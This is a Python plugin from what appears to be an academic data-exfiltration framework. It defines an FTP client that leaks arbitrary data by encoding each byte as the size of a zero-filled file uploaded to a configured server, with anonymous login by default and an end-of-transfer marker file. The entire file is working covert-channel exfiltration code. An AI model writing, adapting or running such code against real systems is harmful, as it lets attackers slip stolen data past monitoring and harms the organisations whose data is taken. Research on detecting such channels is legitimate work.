
from __future__ import annotations
from typing import Dict, Any, Iterable
from ftplib import FTP
import io

from tfg.plugins.api import ExfilClientPlugin

BASE = 4096  # tamaño base para distinguir (evitar 0 bytes)

class FtpClientSize(ExfilClientPlugin):
    canal = "FTP"
    metodo = 3
    name = "ftp_client_size"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        host = config["host"]; port = int(config.get("port", 21))
        user = config.get("user") or "anonymous"
        password = config.get("password") or "anonymous@"
        root = config.get("root") or "/"
        exfil_id = config.get("exfil_id") or "tfg"

        ftp = FTP(); ftp.connect(host, port, timeout=30); ftp.login(user=user, passwd=password)
        if root and root != "/":
            try: ftp.cwd(root)
            except Exception: ftp.mkd(root); ftp.cwd(root)

        seq = 0; total = 0
        for chunk in payload_iter:
            for b in chunk:
                size = BASE + b  # un byte por fichero
                name = f"{exfil_id}.sz.{seq:06d}"
                ftp.storbinary(f"STOR {name}", io.BytesIO(b"\x00" * size))
                total += 1; seq += 1
        ftp.storbinary(f"STOR {exfil_id}.EOT", io.BytesIO(b""))
        ftp.quit()
        return {"ok": True, "files": seq, "bytes": total}
